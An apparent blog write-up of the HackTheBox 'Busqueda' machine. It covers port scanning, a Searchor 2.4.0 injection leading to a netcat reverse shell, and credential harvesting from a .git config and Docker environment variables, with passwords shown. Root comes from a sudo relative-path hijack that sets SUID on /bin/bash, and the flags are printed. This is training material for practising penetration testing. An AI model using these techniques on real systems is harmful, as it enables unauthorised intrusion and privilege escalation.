---
title: "Busqueda"
date: 2025-06-20
categories:
  - HackTheBox
  - Linux
tags:
  - HackTheBox
  - Linux
---

# Busqueda

![](../assets/Pasted%20image%2020250607172201.png)
<!-- more -->

## Enumeration

```shell
$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.11.208
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-07 17:27 CEST
Nmap scan report for 10.10.11.208
Host is up (0.041s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://searcher.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   40.61 ms 10.10.14.1
2   40.83 ms 10.10.11.208

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.88 seconds
```

Add `searcher.htb` to `/etc/hosts`.

The site is a Flask project using `searchor` `2.4.0`.

![](../assets/Pasted%20image%2020250608160323.png)

Searching a little, we find a POC.

[https://github.com/nexis-nexis/Searchor-2.4.0-POC-Exploit-](https://github.com/nexis-nexis/Searchor-2.4.0-POC-Exploit-)

## Initial Access

So, capture the request with Caido and edit the `search` param.

![](../assets/Pasted%20image%2020250608161312.png)

```shell
$ rlwrap nc -lnvp 7777                        
listening on [any] 7777 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.11.208] 42334
/bin/sh: 0: can't access tty; job control turned off
$ whoami
svc
```

Get the flag

```shell
$ cat user.txt
0d5be9ebe2b24d31d36913f7abe06b8a
```

## Privilege Escalation

Inside the app project's folder there is a `.git` folder, the config file has the `svc` password.

![](../assets/Pasted%20image%2020250607180554.png)

Re-enter via SSH for an easier shell.

```shell
$ ssh svc@10.10.11.208

Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-69-generic x86_64)

...
The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Apr  4 17:02:09 2023 from 10.10.14.19
```

With `sudo -l`:

```shell
svc@busqueda:/opt/scripts$ sudo -l
[sudo] password for svc: 
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

```shell
svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' 960873171e2e | jq .
```

```shell
"Env": [
      "USER_UID=115",
      "USER_GID=121",
      "GITEA__database__DB_TYPE=mysql",
      "GITEA__database__HOST=db:3306",
      "GITEA__database__NAME=gitea",
      "GITEA__database__USER=gitea",
      "GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh",
      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
      "USER=git",
      "GITEA_CUSTOM=/data/gitea"
    ],
```

```shell
"Env": [
      "MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF",
      "MYSQL_USER=gitea",
      "MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh",
      "MYSQL_DATABASE=gitea",
      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
      "GOSU_VERSION=1.14",
      "MYSQL_MAJOR=8.0",
      "MYSQL_VERSION=8.0.31-1.el8",
      "MYSQL_SHELL_VERSION=8.0.31-1.el8"
    ],
```

We can try these admin credentials on Gitea.

![](../assets/Pasted%20image%2020250608181134.png)

Looking at the code for `system-checkup.py` we can notice that `full-checkup.sh` is being called without an absolute path.

![](../assets/Pasted%20image%2020250608181826.png)

```shell
svc@busqueda:/tmp$ echo -e '#!/bin/bash\nchmod u+s /bin/bash' > full-checkup.sh && chmod +x full-checkup.sh
svc@busqueda:/tmp$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup

[+] Done!
svc@busqueda:/tmp$ bash -p
bash-5.1# whoami
root
```

## Post Exploitation

Get the flag

```shell
bash-5.1# cat /root/root.txt
59784d838c55bf5fe8089b49bac638d6
```
